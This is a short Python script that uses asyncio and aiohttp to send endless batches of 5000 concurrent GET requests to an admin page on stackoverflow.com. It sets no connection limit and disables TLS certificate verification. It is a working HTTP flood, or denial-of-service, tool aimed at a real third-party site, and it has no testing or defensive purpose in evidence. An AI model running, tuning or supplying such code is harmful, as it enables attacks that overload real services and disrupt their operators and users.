import asyncio
import aiohttp
import ssl


url = "https://stackoverflow.com/admin.php?asphragus"
i = 0

async def make_request(session):
    async with session.get(url) as res:
        print("sent")

num_request = 5000

async def main():
    ssl_context = ssl.SSLContext()
    ssl_context.verify_mode = ssl.CERT_NONE
    
    connector = aiohttp.TCPConnector(ssl = ssl_context, limit = None)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            coroutines = [make_request(session) for _ in range(num_request)]
            await asyncio.gather(*coroutines)

            await asyncio.sleep(0)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    finally:
        loop.close()